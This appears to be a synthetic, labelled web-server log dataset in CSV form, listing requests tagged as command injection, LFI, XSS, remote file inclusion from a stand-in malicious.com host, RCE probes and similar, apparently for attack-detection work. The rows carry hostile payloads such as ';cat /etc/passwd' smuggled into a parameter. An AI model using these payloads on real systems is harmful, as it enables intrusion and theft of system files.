ip,timestamp,request,status,size,attack_type
50.119.254.222,2025-03-15 12:23:21,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,1804,COMMAND_INJECTION
94.207.51.56,2025-03-15 12:23:22,GET /etc/passwd HTTP/1.1,403,3246,PATH_TRAVERSAL
111.149.251.43,2025-03-15 12:23:26,POST /change-email?email=attacker@example.com HTTP/1.1,200,4383,CSRF_ATTACK
188.83.205.147,2025-03-15 12:22:51,POST /upload-xml HTTP/1.1,403,772,XXE_ATTACK
6.234.188.47,2025-03-15 12:23:11,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,2196,XSS_ATTACK
202.40.77.202,2025-03-15 12:23:09,POST /upload-xml HTTP/1.1,403,1080,XXE_ATTACK
171.251.202.22,2025-03-15 12:23:39,GET /execute?cmd=whoami HTTP/1.1,403,2026,RCE_ATTACK
175.199.221.192,2025-03-15 12:23:32,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,2587,REMOTE_FILE_INCLUSION
172.76.163.215,2025-03-15 12:23:07,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,1631,COMMAND_INJECTION
106.142.151.144,2025-03-15 12:23:15,POST /wp-json/wp/v2/users HTTP/1.1,403,1268,USER_ENUMERATION
72.228.197.241,2025-03-15 12:23:44,POST /upload-xml HTTP/1.1,403,692,XXE_ATTACK
251.23.107.154,2025-03-15 12:23:28,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,3933,XSS_ATTACK
37.160.74.109,2025-03-15 12:23:16,POST /wp-json/wp/v2/users HTTP/1.1,403,2086,USER_ENUMERATION
22.109.50.67,2025-03-15 12:23:02,GET /execute?cmd=whoami HTTP/1.1,403,2831,RCE_ATTACK
152.198.219.16,2025-03-15 12:23:05,POST /change-email?email=attacker@example.com HTTP/1.1,200,3831,CSRF_ATTACK
240.74.190.101,2025-03-15 12:23:04,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,829,REMOTE_FILE_INCLUSION
184.62.24.182,2025-03-15 12:23:43,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,1226,XSS_ATTACK
229.201.36.156,2025-03-15 12:23:05,GET /api/user?username=admin HTTP/1.1,403,3850,API_ABUSE
234.197.205.192,2025-03-15 12:23:41,GET /execute?cmd=whoami HTTP/1.1,403,641,RCE_ATTACK
128.3.29.48,2025-03-15 12:23:01,GET /api/user?username=admin HTTP/1.1,403,2537,API_ABUSE
58.149.201.115,2025-03-15 12:23:04,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,1413,COMMAND_INJECTION
77.169.212.226,2025-03-15 12:23:25,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,1903,COMMAND_INJECTION
245.175.155.36,2025-03-15 12:23:40,GET /api/user?username=admin HTTP/1.1,403,4915,API_ABUSE
174.139.9.183,2025-03-15 12:23:16,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,1146,XSS_ATTACK
81.82.58.178,2025-03-15 12:23:38,GET /api/user?username=admin HTTP/1.1,403,4153,API_ABUSE
99.92.168.30,2025-03-15 12:23:14,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,2870,XSS_ATTACK
64.153.236.212,2025-03-15 12:23:05,POST /upload-xml HTTP/1.1,403,3934,XXE_ATTACK
33.133.51.138,2025-03-15 12:23:13,GET /etc/passwd HTTP/1.1,403,1343,PATH_TRAVERSAL
31.227.14.33,2025-03-15 12:23:41,GET /etc/passwd HTTP/1.1,403,522,PATH_TRAVERSAL
36.36.154.184,2025-03-15 12:23:31,GET /api/user?username=admin HTTP/1.1,403,1618,API_ABUSE
3.198.26.169,2025-03-15 12:22:50,POST /change-email?email=attacker@example.com HTTP/1.1,200,2157,CSRF_ATTACK
103.244.168.250,2025-03-15 12:22:58,GET /execute?cmd=whoami HTTP/1.1,403,1673,RCE_ATTACK
109.169.101.101,2025-03-15 12:23:18,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,3249,LFI_ATTACK
205.231.81.43,2025-03-15 12:23:35,POST /change-email?email=attacker@example.com HTTP/1.1,200,4078,CSRF_ATTACK
43.57.246.218,2025-03-15 12:23:06,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,2529,LFI_ATTACK
197.160.74.246,2025-03-15 12:23:45,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4488,REMOTE_FILE_INCLUSION
103.30.204.114,2025-03-15 12:23:09,POST /wp-json/wp/v2/users HTTP/1.1,403,3719,USER_ENUMERATION
23.209.214.220,2025-03-15 12:23:05,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,1957,COMMAND_INJECTION
33.150.30.33,2025-03-15 12:23:35,GET /api/user?username=admin HTTP/1.1,403,3049,API_ABUSE
199.240.45.252,2025-03-15 12:23:31,POST /upload-xml HTTP/1.1,403,4026,XXE_ATTACK
227.85.110.86,2025-03-15 12:23:25,POST /upload-xml HTTP/1.1,403,2225,XXE_ATTACK
65.239.15.77,2025-03-15 12:23:34,POST /upload-xml HTTP/1.1,403,3644,XXE_ATTACK
218.167.159.255,2025-03-15 12:23:13,POST /wp-json/wp/v2/users HTTP/1.1,403,3265,USER_ENUMERATION
45.116.64.232,2025-03-15 12:22:56,GET /execute?cmd=whoami HTTP/1.1,403,2884,RCE_ATTACK
17.76.55.2,2025-03-15 12:23:32,GET /api/user?username=admin HTTP/1.1,403,2031,API_ABUSE
139.93.99.159,2025-03-15 12:23:31,GET /etc/passwd HTTP/1.1,403,753,PATH_TRAVERSAL
36.210.112.186,2025-03-15 12:22:53,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4869,REMOTE_FILE_INCLUSION
57.13.249.172,2025-03-15 12:23:33,GET /api/user?username=admin HTTP/1.1,403,3593,API_ABUSE
194.111.147.91,2025-03-15 12:23:39,GET /execute?cmd=whoami HTTP/1.1,403,1719,RCE_ATTACK
110.171.151.210,2025-03-15 12:23:40,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,607,REMOTE_FILE_INCLUSION
218.65.212.222,2025-03-15 12:23:11,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,2283,REMOTE_FILE_INCLUSION
190.119.77.47,2025-03-15 12:22:58,POST /wp-json/wp/v2/users HTTP/1.1,403,4881,USER_ENUMERATION
204.169.182.144,2025-03-15 12:23:03,POST /wp-json/wp/v2/users HTTP/1.1,403,4747,USER_ENUMERATION
214.253.17.36,2025-03-15 12:22:55,POST /wp-json/wp/v2/users HTTP/1.1,403,608,USER_ENUMERATION
37.255.246.61,2025-03-15 12:23:18,GET /execute?cmd=whoami HTTP/1.1,403,1585,RCE_ATTACK
103.164.198.55,2025-03-15 12:23:10,GET /execute?cmd=whoami HTTP/1.1,403,3782,RCE_ATTACK
135.70.139.212,2025-03-15 12:23:05,GET /execute?cmd=whoami HTTP/1.1,403,4716,RCE_ATTACK
25.241.56.177,2025-03-15 12:23:25,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,3616,COMMAND_INJECTION
207.169.246.20,2025-03-15 12:23:02,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,2856,LFI_ATTACK
218.163.253.77,2025-03-15 12:22:57,POST /wp-json/wp/v2/users HTTP/1.1,403,3348,USER_ENUMERATION
101.96.157.179,2025-03-15 12:23:45,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4125,LFI_ATTACK
107.45.116.199,2025-03-15 12:23:46,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,2742,XSS_ATTACK
117.140.112.30,2025-03-15 12:22:50,GET /api/user?username=admin HTTP/1.1,403,2795,API_ABUSE
86.183.14.220,2025-03-15 12:23:42,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,2552,XSS_ATTACK
124.203.207.247,2025-03-15 12:23:05,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4876,LFI_ATTACK
247.144.38.254,2025-03-15 12:23:26,GET /etc/passwd HTTP/1.1,403,4067,PATH_TRAVERSAL
177.233.49.94,2025-03-15 12:22:52,GET /execute?cmd=whoami HTTP/1.1,403,4273,RCE_ATTACK
84.65.35.144,2025-03-15 12:23:32,POST /change-email?email=attacker@example.com HTTP/1.1,200,825,CSRF_ATTACK
239.80.153.51,2025-03-15 12:23:26,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,4587,XSS_ATTACK
254.66.231.112,2025-03-15 12:23:17,POST /wp-json/wp/v2/users HTTP/1.1,403,833,USER_ENUMERATION
200.130.53.165,2025-03-15 12:23:45,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,536,REMOTE_FILE_INCLUSION
1.117.0.61,2025-03-15 12:23:10,GET /etc/passwd HTTP/1.1,403,2897,PATH_TRAVERSAL
18.227.183.86,2025-03-15 12:23:35,POST /change-email?email=attacker@example.com HTTP/1.1,200,3938,CSRF_ATTACK
115.1.80.170,2025-03-15 12:23:20,GET /etc/passwd HTTP/1.1,403,1482,PATH_TRAVERSAL
161.195.224.171,2025-03-15 12:23:23,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,4317,COMMAND_INJECTION
80.173.107.65,2025-03-15 12:22:56,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,1831,LFI_ATTACK
36.92.91.193,2025-03-15 12:23:31,GET /execute?cmd=whoami HTTP/1.1,403,1348,RCE_ATTACK
113.135.131.139,2025-03-15 12:23:24,GET /etc/passwd HTTP/1.1,403,4220,PATH_TRAVERSAL
91.63.56.28,2025-03-15 12:22:57,POST /wp-json/wp/v2/users HTTP/1.1,403,4263,USER_ENUMERATION
91.71.63.237,2025-03-15 12:23:47,GET /etc/passwd HTTP/1.1,403,2397,PATH_TRAVERSAL
172.77.191.191,2025-03-15 12:23:36,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,4070,XSS_ATTACK
55.228.238.125,2025-03-15 12:23:18,POST /upload-xml HTTP/1.1,403,4258,XXE_ATTACK
120.218.163.145,2025-03-15 12:22:56,POST /wp-json/wp/v2/users HTTP/1.1,403,4685,USER_ENUMERATION
70.99.105.123,2025-03-15 12:22:56,POST /wp-json/wp/v2/users HTTP/1.1,403,1545,USER_ENUMERATION
91.4.29.116,2025-03-15 12:23:30,POST /change-email?email=attacker@example.com HTTP/1.1,200,3718,CSRF_ATTACK
44.25.127.186,2025-03-15 12:23:09,GET /api/user?username=admin HTTP/1.1,403,4619,API_ABUSE
77.113.19.177,2025-03-15 12:23:43,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,2184,COMMAND_INJECTION
6.142.113.200,2025-03-15 12:23:06,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,509,COMMAND_INJECTION
112.149.114.104,2025-03-15 12:22:57,GET /api/user?username=admin HTTP/1.1,403,3424,API_ABUSE
187.32.44.157,2025-03-15 12:23:15,GET /etc/passwd HTTP/1.1,403,1993,PATH_TRAVERSAL
229.25.74.227,2025-03-15 12:23:06,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,3577,REMOTE_FILE_INCLUSION
210.62.135.14,2025-03-15 12:23:27,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,1190,REMOTE_FILE_INCLUSION
153.137.88.92,2025-03-15 12:23:32,GET /etc/passwd HTTP/1.1,403,4832,PATH_TRAVERSAL
213.169.8.9,2025-03-15 12:23:04,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,2159,COMMAND_INJECTION
2.73.6.249,2025-03-15 12:23:00,POST /change-email?email=attacker@example.com HTTP/1.1,200,4563,CSRF_ATTACK
235.52.252.64,2025-03-15 12:23:31,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,1488,XSS_ATTACK
239.212.44.188,2025-03-15 12:23:07,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,3879,COMMAND_INJECTION
192.170.96.32,2025-03-15 12:23:17,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4577,LFI_ATTACK
11.133.154.96,2025-03-15 12:23:39,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,1270,REMOTE_FILE_INCLUSION
115.17.123.40,2025-03-15 12:23:47,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,1618,COMMAND_INJECTION
104.235.14.254,2025-03-15 12:23:50,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,1264,LFI_ATTACK
199.212.174.154,2025-03-15 12:23:18,POST /upload-xml HTTP/1.1,403,1670,XXE_ATTACK
89.36.82.225,2025-03-15 12:23:02,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,530,LFI_ATTACK
203.107.62.186,2025-03-15 12:23:07,POST /upload-xml HTTP/1.1,403,3522,XXE_ATTACK
37.218.234.31,2025-03-15 12:23:01,POST /upload-xml HTTP/1.1,403,3658,XXE_ATTACK
120.65.218.130,2025-03-15 12:23:02,POST /change-email?email=attacker@example.com HTTP/1.1,200,1995,CSRF_ATTACK
32.124.208.76,2025-03-15 12:23:24,POST /change-email?email=attacker@example.com HTTP/1.1,200,885,CSRF_ATTACK
123.111.108.81,2025-03-15 12:23:00,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,1769,XSS_ATTACK
245.227.149.176,2025-03-15 12:23:26,POST /wp-json/wp/v2/users HTTP/1.1,403,689,USER_ENUMERATION
215.95.175.36,2025-03-15 12:23:18,GET /execute?cmd=whoami HTTP/1.1,403,4081,RCE_ATTACK
201.184.52.36,2025-03-15 12:23:21,POST /wp-json/wp/v2/users HTTP/1.1,403,1799,USER_ENUMERATION
249.27.21.253,2025-03-15 12:23:26,POST /upload-xml HTTP/1.1,403,1701,XXE_ATTACK
17.208.191.65,2025-03-15 12:23:13,POST /upload-xml HTTP/1.1,403,2122,XXE_ATTACK
92.175.43.153,2025-03-15 12:23:22,POST /wp-json/wp/v2/users HTTP/1.1,403,3918,USER_ENUMERATION
70.110.252.92,2025-03-15 12:23:21,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,2193,COMMAND_INJECTION
203.252.27.227,2025-03-15 12:23:20,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,868,XSS_ATTACK
134.59.238.240,2025-03-15 12:23:39,POST /wp-json/wp/v2/users HTTP/1.1,403,3225,USER_ENUMERATION
253.67.54.139,2025-03-15 12:23:05,POST /change-email?email=attacker@example.com HTTP/1.1,200,4372,CSRF_ATTACK
36.160.188.154,2025-03-15 12:23:30,GET /etc/passwd HTTP/1.1,403,1984,PATH_TRAVERSAL
18.158.202.155,2025-03-15 12:23:10,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,3455,COMMAND_INJECTION
27.29.114.129,2025-03-15 12:23:40,POST /wp-json/wp/v2/users HTTP/1.1,403,1701,USER_ENUMERATION
129.87.195.242,2025-03-15 12:23:42,POST /change-email?email=attacker@example.com HTTP/1.1,200,4841,CSRF_ATTACK
47.48.57.180,2025-03-15 12:22:54,POST /upload-xml HTTP/1.1,403,1298,XXE_ATTACK
131.56.223.202,2025-03-15 12:23:31,POST /upload-xml HTTP/1.1,403,542,XXE_ATTACK
9.201.186.148,2025-03-15 12:23:00,POST /wp-json/wp/v2/users HTTP/1.1,403,2247,USER_ENUMERATION
56.239.244.37,2025-03-15 12:23:07,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4696,REMOTE_FILE_INCLUSION
177.173.162.59,2025-03-15 12:23:00,GET /api/user?username=admin HTTP/1.1,403,2353,API_ABUSE
157.93.80.197,2025-03-15 12:23:09,GET /api/user?username=admin HTTP/1.1,403,518,API_ABUSE
239.205.150.54,2025-03-15 12:23:31,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,1043,XSS_ATTACK
131.128.147.207,2025-03-15 12:23:32,GET /api/user?username=admin HTTP/1.1,403,808,API_ABUSE
193.6.99.232,2025-03-15 12:23:20,GET /etc/passwd HTTP/1.1,403,501,PATH_TRAVERSAL
94.16.185.218,2025-03-15 12:23:05,GET /etc/passwd HTTP/1.1,403,559,PATH_TRAVERSAL
236.98.181.66,2025-03-15 12:23:38,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,2885,XSS_ATTACK
104.96.195.30,2025-03-15 12:23:38,POST /wp-json/wp/v2/users HTTP/1.1,403,3255,USER_ENUMERATION
193.155.224.100,2025-03-15 12:23:44,POST /change-email?email=attacker@example.com HTTP/1.1,200,2401,CSRF_ATTACK
155.66.32.65,2025-03-15 12:22:56,GET /execute?cmd=whoami HTTP/1.1,403,706,RCE_ATTACK
46.81.103.61,2025-03-15 12:23:49,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,2832,COMMAND_INJECTION
93.201.229.249,2025-03-15 12:23:05,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,4439,XSS_ATTACK
172.222.182.12,2025-03-15 12:23:36,GET /execute?cmd=whoami HTTP/1.1,403,2286,RCE_ATTACK
214.190.49.10,2025-03-15 12:22:57,POST /wp-json/wp/v2/users HTTP/1.1,403,734,USER_ENUMERATION
223.99.75.202,2025-03-15 12:23:35,GET /etc/passwd HTTP/1.1,403,3343,PATH_TRAVERSAL
178.16.243.236,2025-03-15 12:22:55,GET /etc/passwd HTTP/1.1,403,714,PATH_TRAVERSAL
24.177.247.42,2025-03-15 12:23:46,GET /execute?cmd=whoami HTTP/1.1,403,872,RCE_ATTACK
3.206.203.31,2025-03-15 12:22:59,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,1303,REMOTE_FILE_INCLUSION
220.49.70.50,2025-03-15 12:23:04,GET /api/user?username=admin HTTP/1.1,403,1830,API_ABUSE
19.129.156.178,2025-03-15 12:23:51,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,2059,LFI_ATTACK
142.126.180.59,2025-03-15 12:23:18,GET /execute?cmd=whoami HTTP/1.1,403,4236,RCE_ATTACK
109.122.137.176,2025-03-15 12:23:26,POST /wp-json/wp/v2/users HTTP/1.1,403,4154,USER_ENUMERATION
237.128.114.205,2025-03-15 12:23:40,POST /change-email?email=attacker@example.com HTTP/1.1,200,4675,CSRF_ATTACK
162.33.28.119,2025-03-15 12:23:34,GET /execute?cmd=whoami HTTP/1.1,403,4295,RCE_ATTACK
234.169.85.134,2025-03-15 12:23:11,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,3889,LFI_ATTACK
195.213.114.23,2025-03-15 12:22:59,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4325,REMOTE_FILE_INCLUSION
25.120.46.170,2025-03-15 12:23:16,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,522,LFI_ATTACK
230.151.176.50,2025-03-15 12:23:22,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,1076,LFI_ATTACK
156.50.38.85,2025-03-15 12:23:11,POST /upload-xml HTTP/1.1,403,2872,XXE_ATTACK
118.239.36.8,2025-03-15 12:23:16,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4200,REMOTE_FILE_INCLUSION
123.65.133.184,2025-03-15 12:23:05,POST /upload-xml HTTP/1.1,403,1373,XXE_ATTACK
199.227.45.202,2025-03-15 12:23:32,GET /execute?cmd=whoami HTTP/1.1,403,4960,RCE_ATTACK
108.24.173.10,2025-03-15 12:23:15,POST /upload-xml HTTP/1.1,403,2568,XXE_ATTACK
160.40.144.47,2025-03-15 12:23:43,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,587,XSS_ATTACK
24.171.147.23,2025-03-15 12:23:20,POST /change-email?email=attacker@example.com HTTP/1.1,200,1299,CSRF_ATTACK
194.76.175.143,2025-03-15 12:23:12,GET /api/user?username=admin HTTP/1.1,403,1932,API_ABUSE
25.200.123.213,2025-03-15 12:22:57,GET /execute?cmd=whoami HTTP/1.1,403,3878,RCE_ATTACK
136.72.183.48,2025-03-15 12:23:06,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4100,REMOTE_FILE_INCLUSION
26.140.227.150,2025-03-15 12:23:32,GET /api/user?username=admin HTTP/1.1,403,827,API_ABUSE
7.185.188.24,2025-03-15 12:23:30,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,3733,LFI_ATTACK
170.189.148.32,2025-03-15 12:23:50,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4003,LFI_ATTACK
122.94.224.116,2025-03-15 12:23:25,POST /change-email?email=attacker@example.com HTTP/1.1,200,4048,CSRF_ATTACK
49.21.107.246,2025-03-15 12:23:35,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,3743,REMOTE_FILE_INCLUSION
107.10.132.52,2025-03-15 12:23:00,POST /upload-xml HTTP/1.1,403,1763,XXE_ATTACK
109.240.234.115,2025-03-15 12:23:50,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,1508,REMOTE_FILE_INCLUSION
168.136.80.225,2025-03-15 12:23:35,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,545,XSS_ATTACK
219.33.118.176,2025-03-15 12:23:45,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,3337,LFI_ATTACK
44.131.36.162,2025-03-15 12:23:21,POST /wp-json/wp/v2/users HTTP/1.1,403,2862,USER_ENUMERATION
147.30.228.178,2025-03-15 12:23:32,GET /etc/passwd HTTP/1.1,403,3847,PATH_TRAVERSAL
12.247.95.146,2025-03-15 12:23:11,GET /api/user?username=admin HTTP/1.1,403,1059,API_ABUSE
113.149.73.45,2025-03-15 12:23:36,POST /upload-xml HTTP/1.1,403,4288,XXE_ATTACK
45.7.112.194,2025-03-15 12:23:44,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,1683,LFI_ATTACK
116.137.216.131,2025-03-15 12:23:16,GET /api/user?username=admin HTTP/1.1,403,3473,API_ABUSE
88.98.230.138,2025-03-15 12:23:33,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,1805,COMMAND_INJECTION
90.99.118.204,2025-03-15 12:23:29,POST /upload-xml HTTP/1.1,403,4875,XXE_ATTACK
79.116.4.170,2025-03-15 12:23:45,GET /api/user?username=admin HTTP/1.1,403,4310,API_ABUSE
35.51.23.206,2025-03-15 12:23:25,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,703,XSS_ATTACK
176.78.22.171,2025-03-15 12:23:41,POST /upload-xml HTTP/1.1,403,3472,XXE_ATTACK
111.76.60.148,2025-03-15 12:23:14,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,634,XSS_ATTACK
141.28.197.69,2025-03-15 12:23:08,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,2997,LFI_ATTACK
124.202.151.78,2025-03-15 12:23:13,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,2433,XSS_ATTACK
247.116.68.152,2025-03-15 12:23:29,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,1874,LFI_ATTACK
207.175.151.61,2025-03-15 12:23:02,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,2056,COMMAND_INJECTION
185.98.217.235,2025-03-15 12:23:18,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,1734,XSS_ATTACK
86.11.147.14,2025-03-15 12:23:23,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,762,COMMAND_INJECTION
30.233.234.98,2025-03-15 12:22:58,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,3924,XSS_ATTACK
4.130.39.83,2025-03-15 12:23:20,GET /etc/passwd HTTP/1.1,403,2136,PATH_TRAVERSAL
135.120.172.133,2025-03-15 12:23:22,POST /upload-xml HTTP/1.1,403,1120,XXE_ATTACK
194.222.116.253,2025-03-15 12:23:03,GET /etc/passwd HTTP/1.1,403,4783,PATH_TRAVERSAL
158.117.255.62,2025-03-15 12:23:26,POST /upload-xml HTTP/1.1,403,4417,XXE_ATTACK
171.58.214.190,2025-03-15 12:23:06,POST /upload-xml HTTP/1.1,403,2440,XXE_ATTACK
198.55.254.212,2025-03-15 12:23:07,GET /execute?cmd=whoami HTTP/1.1,403,2663,RCE_ATTACK
83.90.143.83,2025-03-15 12:23:29,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,3413,LFI_ATTACK
199.138.78.207,2025-03-15 12:23:16,POST /upload-xml HTTP/1.1,403,1782,XXE_ATTACK
121.138.34.166,2025-03-15 12:23:02,GET /api/user?username=admin HTTP/1.1,403,1139,API_ABUSE
133.45.180.220,2025-03-15 12:23:35,GET /execute?cmd=whoami HTTP/1.1,403,4300,RCE_ATTACK
71.170.11.200,2025-03-15 12:23:21,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4736,REMOTE_FILE_INCLUSION
74.132.157.26,2025-03-15 12:23:38,POST /wp-json/wp/v2/users HTTP/1.1,403,1957,USER_ENUMERATION
5.135.20.167,2025-03-15 12:23:01,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4710,LFI_ATTACK
12.87.242.149,2025-03-15 12:23:55,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,3293,XSS_ATTACK
218.172.196.186,2025-03-15 12:23:13,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4477,REMOTE_FILE_INCLUSION
165.209.72.247,2025-03-15 12:23:16,POST /upload-xml HTTP/1.1,403,3443,XXE_ATTACK
123.31.115.194,2025-03-15 12:23:01,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,1130,REMOTE_FILE_INCLUSION
200.217.88.180,2025-03-15 12:23:39,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,4831,XSS_ATTACK
228.9.48.118,2025-03-15 12:23:56,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,1640,XSS_ATTACK
190.84.114.33,2025-03-15 12:23:33,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,3852,COMMAND_INJECTION
91.93.194.209,2025-03-15 12:23:40,GET /etc/passwd HTTP/1.1,403,2183,PATH_TRAVERSAL
251.16.85.2,2025-03-15 12:23:27,GET /execute?cmd=whoami HTTP/1.1,403,2810,RCE_ATTACK
186.127.203.152,2025-03-15 12:23:47,POST /change-email?email=attacker@example.com HTTP/1.1,200,1105,CSRF_ATTACK
37.131.171.116,2025-03-15 12:23:48,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,3885,XSS_ATTACK
36.190.56.32,2025-03-15 12:23:21,GET /execute?cmd=whoami HTTP/1.1,403,4013,RCE_ATTACK
185.231.177.152,2025-03-15 12:23:20,GET /etc/passwd HTTP/1.1,403,2558,PATH_TRAVERSAL
18.81.131.241,2025-03-15 12:23:01,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,2636,REMOTE_FILE_INCLUSION
154.17.20.60,2025-03-15 12:23:42,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,4324,COMMAND_INJECTION
247.57.201.117,2025-03-15 12:23:25,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,3939,LFI_ATTACK
1.133.43.247,2025-03-15 12:23:14,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,585,XSS_ATTACK
111.94.161.47,2025-03-15 12:23:41,GET /etc/passwd HTTP/1.1,403,1649,PATH_TRAVERSAL
232.126.102.218,2025-03-15 12:23:35,GET /api/user?username=admin HTTP/1.1,403,1318,API_ABUSE
181.243.42.215,2025-03-15 12:23:32,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,2089,COMMAND_INJECTION
